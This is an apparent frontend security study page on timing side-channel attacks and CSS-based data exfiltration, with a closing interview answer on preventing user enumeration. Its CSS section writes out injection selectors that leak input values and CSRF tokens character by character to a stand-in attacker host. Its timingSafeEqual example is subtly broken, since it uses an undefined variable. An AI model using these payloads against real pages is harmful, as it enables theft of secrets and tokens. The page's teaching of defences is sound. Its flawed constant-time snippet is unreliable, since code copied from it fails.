Timing Side-Channel Attacks

// Timing attack: Infer information from response time

// ═══ Example 1: User enumeration ═══
// Login with existing email: DB lookup + bcrypt = 200ms
// Login with unknown email: early return = 5ms
// Attacker measures: 200ms → email exists!

// Fix: Constant-time comparison
async function login(email, password) {
  const user = await db.findUser(email);
  if (!user) {
    // Still do bcrypt compare to normalize timing
    await bcrypt.compare(password, '$2b$10$dummy_hash_here');
    return null;
  }
  const valid = await bcrypt.compare(password, user.hash);
  return valid ? user : null;
}

// ❌ Unsafe: string === comparison is NOT constant time
if (token === storedToken) { ... }
// Fails faster if first chars differ → attacker brute-forces char by char

// ✅ Safe: crypto.timingSafeEqual
const crypto = require('crypto');

const b = Buffer.from(storedToken);
if (a.length === b.length && crypto.timingSafeEqual(a, b)) { ... }

CSS-Based Data Exfiltration

// CSS can extract data without JavaScript!
// Works even with strict CSP that blocks all scripts

// ═══ Input value extraction ═══
// If page has: <input value="secret">
input[value^="s"] { background: url("//evil.com/?c=s"); }
input[value^="se"] { background: url("//evil.com/?c=se"); }
input[value^="sec"] { background: url("//evil.com/?c=sec"); }
// Browser loads matching background → attacker's server logs it
// Character by character extraction!

// ═══ CSRF token extraction ═══
// <input type="hidden" name="csrf" value="abc123">
input[name="csrf"][value^="a"] { background: url("//evil.com/?a"); }
// Extract CSRF tokens via CSS injection

// ═══ Font-based extraction ═══
// Custom font per character → load triggers reveal

// Defense:
// 1. CSP: style-src 'self' (no attacker stylesheets)
// 2. Don't put sensitive data in HTML attributes
// 3. Use HTTP headers for tokens, not hidden inputs

Google Senior Frontend — Side Channels

Q: How do you defend against timing-based user enumeration?

Layered defense: (1) Constant-time operations: Always perform the same work regardless of input. If user not found: still run bcrypt against a dummy hash. Same DB queries, same computation path. (2) Artificial delay: Add random delay (200-500ms) to all auth responses. Masks the true processing time. But: an attacker with enough samples can still differentiate (statistical analysis). (3) Rate limiting: Max 5 login attempts per IP per minute. Prevents the hundreds of attempts needed for timing analysis. (4) Generic responses: "Invalid credentials" for both wrong email and wrong password. Same HTTP status code. Same response structure. (5) At network level: Use CDN/WAF that normalizes response times. Some CDNs add buffering that masks server-side timing. (6) Monitoring: Detect enumeration patterns — sequential emails, high failure rate from single IP, alphabetical username attempts.
